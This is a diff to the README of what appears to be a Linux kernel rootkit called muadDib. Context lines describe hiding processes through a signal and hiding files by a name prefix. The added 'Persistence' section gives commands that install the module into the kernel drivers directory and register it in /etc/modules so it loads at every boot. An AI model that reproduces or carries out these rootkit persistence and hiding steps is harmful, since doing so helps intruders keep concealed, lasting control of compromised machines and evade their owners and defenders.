@@ -38,6 +38,12 @@ kill -44 [PID to hide]
 All files containing PREFIX [default MUADDIB] are hidden
 ### Misc
 There is also a mkdir and execve hook just as a POC, have not found a use yet.
+
+### Persistence
+Copy muadDib.ko to /lib/modules/$(uname -r)/kernel/drivers/ 
+echo muadDib to /etc/modules
+sudo depmod 
+
 ## Tested on
 Ubuntu 20.04.1 x86_64 Linux 5.13.0
 
